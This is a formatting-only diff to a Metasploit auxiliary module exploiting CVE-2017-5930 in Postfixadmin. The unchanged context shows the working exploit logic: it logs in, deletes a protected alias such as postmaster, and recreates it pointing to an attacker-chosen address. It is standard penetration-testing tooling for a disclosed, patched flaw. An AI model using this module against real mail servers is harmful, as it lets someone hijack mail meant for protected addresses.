@@ -7,28 +7,29 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'Postfixadmin Protected Alias Deletion Vulnerability',
-      'Description'     => %q{
-        Postfixadmin installations between 2.91 and 3.0.1 do not check if an
-        admin is allowed to delete protected aliases. This vulnerability can be
-        used to redirect protected aliases to an other mail address. Eg. rewrite
-        the postmaster@domain alias
-      },
-      'Author'          => [ 'Jan-Frederik Rieckers' ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Postfixadmin Protected Alias Deletion Vulnerability',
+        'Description' => %q{
+          Postfixadmin installations between 2.91 and 3.0.1 do not check if an
+          admin is allowed to delete protected aliases. This vulnerability can be
+          used to redirect protected aliases to an other mail address. Eg. rewrite
+          the postmaster@domain alias
+        },
+        'Author' => [ 'Jan-Frederik Rieckers' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2017-5930'],
           ['URL', 'https://github.com/postfixadmin/postfixadmin/pull/23'],
           ['BID', '96142'],
         ],
-      'Privileged'      => true,
-      'Platform'        => ['php'],
-      'Arch'            => ARCH_PHP,
-      'DisclosureDate'  => '2017-02-03',
-    ))
+        'Privileged' => true,
+        'Platform' => ['php'],
+        'Arch' => ARCH_PHP,
+        'DisclosureDate' => '2017-02-03',
+      )
+    )
 
     register_options(
       [
@@ -37,7 +38,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [true, 'The Postfixadmin password to authenticate with']),
         OptString.new('TARGET_ALIAS', [true, 'The alias which should be rewritten']),
         OptString.new('NEW_GOTO', [true, 'The new redirection target of the alias'])
-      ])
+      ]
+    )
   end
 
   def username
@@ -57,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    res = send_request_cgi({'uri' => postfixadmin_url_login, 'method' => 'GET'})
+    res = send_request_cgi({ 'uri' => postfixadmin_url_login, 'method' => 'GET' })
 
     return Exploit::CheckCode::Unknown unless res
 
@@ -71,12 +73,12 @@ class MetasploitModule < Msf::Auxiliary
       elsif Rex::Version.new("3.0.1") < Rex::Version.new(version[1])
         return Exploit::CheckCode::Detected
       end
+
       return Exploit::CheckCode::Appears
     end
 
     return Exploit::CheckCode::Unknown
   end
-
 
   def run
     print_status("Authenticating with Postfixadmin using #{username}:#{password} ...")
@@ -85,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Authenticated with Postfixadmin')
 
     vprint_status('Requesting virtual_list')
-    res = send_request_cgi({'uri' => postfixadmin_url_list(target_alias.split("@")[-1]), 'method' => 'GET', 'cookie' => cookie }, 10)
+    res = send_request_cgi({ 'uri' => postfixadmin_url_list(target_alias.split("@")[-1]), 'method' => 'GET', 'cookie' => cookie }, 10)
     fail_with(Failure::UnexpectedReply, 'The request for the domain list failed') if res.nil?
     fail_with(Failure::NoAccess, 'Doesn\'t seem to be admin for the domain the target alias is in') if res.redirect?
     body = res.body
@@ -96,11 +98,11 @@ class MetasploitModule < Msf::Auxiliary
     t = token[1]
 
     print_status('Delete the old alias')
-    res = send_request_cgi({'uri' => postfixadmin_url_alias_delete(target_alias, t), 'method' => 'GET', 'cookie' => cookie }, 10)
+    res = send_request_cgi({ 'uri' => postfixadmin_url_alias_delete(target_alias, t), 'method' => 'GET', 'cookie' => cookie }, 10)
 
     fail_with(Failure::UnexpectedReply, 'Didn\'t get redirected.') unless res && res.redirect?
 
-    res = send_request_cgi({'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)
+    res = send_request_cgi({ 'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)
 
     if res.nil? || res.body.nil? || res.body !~ /<ul class="flash-info">.*<li.*#{target_alias}.*<\/li>.*<\/ul>/mi
       if res.nil? || res.body.nil?
@@ -116,13 +118,13 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Deleted the old alias')
 
     vprint_status('Will create the new alias')
-    post_vars = {'submit' => 'Add alias', 'table' => 'alias', 'value[active]' => 1, 'value[domain]' => target_alias.split("@")[-1], 'value[localpart]' => target_alias.split("@")[0..-2].join("@"), 'value[goto]' => new_goto}
+    post_vars = { 'submit' => 'Add alias', 'table' => 'alias', 'value[active]' => 1, 'value[domain]' => target_alias.split("@")[-1], 'value[localpart]' => target_alias.split("@")[0..-2].join("@"), 'value[goto]' => new_goto }
 
-    res = send_request_cgi({'uri' => postfixadmin_url_edit, 'method' => 'POST', 'cookie' => cookie, 'vars_post' => post_vars }, 10)
+    res = send_request_cgi({ 'uri' => postfixadmin_url_edit, 'method' => 'POST', 'cookie' => cookie, 'vars_post' => post_vars }, 10)
 
     fail_with(Failure::UnexpectedReply, 'Didn\'t get redirected.') unless res && res.redirect?
 
-    res = send_request_cgi({'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)
+    res = send_request_cgi({ 'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)
 
     if res.nil? || res.body.nil? || res.body !~ /<ul class="flash-info">.*<li.*#{target_alias}.*<\/li>.*<\/ul>/mi
       if res.nil? || res.body.nil?
@@ -136,9 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     print_good('New alias created')
-
   end
-
 
   # Performs a Postfixadmin login
   #
@@ -151,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => postfixadmin_url_login,
-      'vars_post' => {'fUsername' => user.to_s, 'fPassword' => pass.to_s, 'lang' => 'en', 'Submit' => 'Login'}
+      'vars_post' => { 'fUsername' => user.to_s, 'fPassword' => pass.to_s, 'lang' => 'en', 'Submit' => 'Login' }
     }, timeout)
     if res && res.redirect?
       cookies = res.get_cookies
@@ -166,7 +166,7 @@ class MetasploitModule < Msf::Auxiliary
     normalize_uri(target_uri.path, 'login.php')
   end
 
-  def postfixadmin_url_list(domain=nil)
+  def postfixadmin_url_list(domain = nil)
     modifier = domain.nil? ? "" : "?domain=#{domain}"
     normalize_uri(target_uri.path, 'list-virtual.php' + modifier)
   end
